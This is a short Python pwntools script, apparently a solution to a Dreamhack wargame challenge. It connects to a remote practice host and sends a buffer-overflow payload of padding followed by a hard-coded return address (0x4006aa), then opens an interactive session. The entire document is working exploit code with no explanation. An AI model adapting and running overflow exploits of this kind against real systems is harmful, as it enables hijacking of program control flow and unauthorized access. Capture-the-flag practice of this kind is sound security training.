from pwn import *

p = remote('host3.dreamhack.games',12915)

a = 'A'*0x30
a += 'B'*0x8
a += '\xaa\x06\x40\x00\x00\x00\x00\x00'

#p.recv()
p.sendline(a)
p.interactive()

